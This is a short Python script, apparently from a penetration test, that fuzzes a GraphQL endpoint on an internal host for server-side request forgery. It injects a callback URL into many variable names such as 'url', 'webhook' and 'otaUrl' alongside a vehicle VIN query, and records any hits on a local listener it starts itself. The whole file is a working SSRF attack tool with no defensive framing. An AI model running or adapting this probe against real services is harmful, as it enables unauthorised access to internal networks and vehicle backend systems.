import http.server, socketserver, threading, requests, time
HOST_IP="10.252.3.20"; PORT=19321
hits=[]
class H(http.server.BaseHTTPRequestHandler):
    def _h(self):
        n=int(self.headers.get("Content-Length",0) or 0)
        body=self.rfile.read(n) if n else b""
        hits.append((self.command,self.path,dict(self.headers),body[:200]))
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
    do_GET=_h; do_POST=_h
    def log_message(self,*a): pass
class S(socketserver.TCPServer): allow_reuse_address=True
srv=S((HOST_IP,PORT),H)
threading.Thread(target=srv.serve_forever,daemon=True).start()
print("listening",HOST_IP,PORT)
URL="http://10.225.139.2:8080/graphql"
probe=f"http://{HOST_IP}:{PORT}/ssrf"
keys=["url","uri","endpoint","target","host","callback","webhook","fetch","src","source","link","packageUrl","package_url","downloadUrl","download_url","artifact","artifactUrl","otaUrl","resource","remote","server","proxy","backend","upstream","api","base","baseUrl","base_url"]
sent=0
for k in keys:
    for body in [{"query":"{vehicles{vin}}","variables":{k:probe}},
                 {"query":probe,"variables":{}},
                 {"query":"{vehicles{vin}}","variables":{"url":probe,k:probe}}]:
        try: requests.post(URL,json=body,timeout=4); sent+=1
        except Exception: pass
time.sleep(2); srv.shutdown()
print("sent",sent,"hits",len(hits))
for h in hits: print(h)
